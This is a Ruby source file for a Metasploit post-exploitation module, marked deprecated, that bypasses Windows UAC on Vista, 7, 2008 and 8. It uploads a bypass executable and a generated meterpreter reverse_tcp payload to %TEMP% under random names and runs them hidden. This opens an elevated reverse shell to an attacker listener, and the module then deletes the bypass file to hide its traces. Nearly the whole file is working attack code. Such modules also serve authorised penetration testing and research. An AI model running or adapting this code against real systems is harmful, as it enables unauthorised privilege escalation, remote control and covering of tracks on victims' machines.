##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	require 'msf/core/module/deprecated'
	include Msf::Module::Deprecated
	deprecated Date.new(2013,1,4), "exploit/windows/local/bypassuac"

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Escalate UAC Protection Bypass',
			'Description'   => %q{
				This module will bypass Windows UAC by utilizing the trusted publisher
				certificate through process injection. It will spawn a second shell that
				has the UAC flag turned off.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>', 'mitnick' ],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'References'    => [
				[ 'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]
			],
			'DisclosureDate'=> "Dec 31 2010"
		))

		register_options([
			OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
			OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
		])

	end

	def run
		vuln = false
		sysinfo = session.sys.config.sysinfo
		winver = sysinfo["OS"]
		affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008', 'Windows 8' ]
		affected.each { |v|
			if winver.include? v
				vuln = true
			end
		}
		if not vuln
			print_error("#{winver} is not vulnerable.")
			return
		end

		lhost = datastore["LHOST"] || Rex::Socket.source_address
		lport = datastore["LPORT"] || 4444
		payload = datastore['PAYLOAD'] || "windows/meterpreter/reverse_tcp"

		# create a session handler
		handler = session.framework.exploits.create("multi/handler")
		handler.register_parent(self)
		handler.datastore['PAYLOAD'] = payload
		handler.datastore['LHOST']   = lhost
		handler.datastore['LPORT']   = lport
		handler.datastore['InitialAutoRunScript'] = "migrate -f"
		handler.datastore['ExitOnSession'] = true
		handler.datastore['ListenerTimeout'] = 300
		handler.datastore['ListenerComm'] = 'local'

		# start the session handler

		#handler.exploit_module = self
		handler.exploit_simple(
			'LocalInput'  => self.user_input,
			'LocalOutput' => self.user_output,
			'Payload'  => handler.datastore['PAYLOAD'],
			'RunAsJob' => true
		)

		#
		# Upload the UACBypass to the filesystem
		#

		# randomize the filename
		filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# randomize the exe name
		tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# path to the bypassuac binary
		path = ::File.join(Msf::Config.install_root, "data", "post")

		# decide, x86 or x64
		bpexe = nil
		if payload =~ /x64/ or sysinfo["Architecture"] =~ /wow64/i
			bpexe = ::File.join(path, "bypassuac-x64.exe")
		else
			bpexe = ::File.join(path, "bypassuac-x86.exe")
		end

		# generate a payload
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport

		raw = pay.generate

		exe = Msf::Util::EXE.to_win32pe(session.framework, raw)

		sysdir = session.fs.file.expand_path("%SystemRoot%")
		tmpdir = session.fs.file.expand_path("%TEMP%")
		cmd = "#{tmpdir}\\#{filename} /c %TEMP%\\#{tempexe_name}"

		print_status("Uploading the bypass UAC executable to the filesystem...")

		begin
			#
			# Upload UAC bypass to the filesystem
			#
			session.fs.file.upload_file("%TEMP%\\#{filename}", bpexe)
			print_status("Meterpreter stager executable #{exe.length} bytes long being uploaded..")
			#
			# Upload the payload to the filesystem
			#
			tempexe = tmpdir + "\\" + tempexe_name
			fd = client.fs.file.new(tempexe, "wb")
			fd.write(exe)
			fd.close
		rescue ::Exception => e
			print_error("Error uploading file #{filename}: #{e.class} #{e}")
			return
		end

		print_status("Uploaded the agent to the filesystem....")

		# execute the payload
		session.sys.process.execute(cmd, nil, {'Hidden' => true})

		# delete the uac bypass payload
		delete_file = "cmd.exe /c del #{tmpdir}\\#{filename}"

		session.sys.process.execute(delete_file, nil, {'Hidden' => true})
	end


end
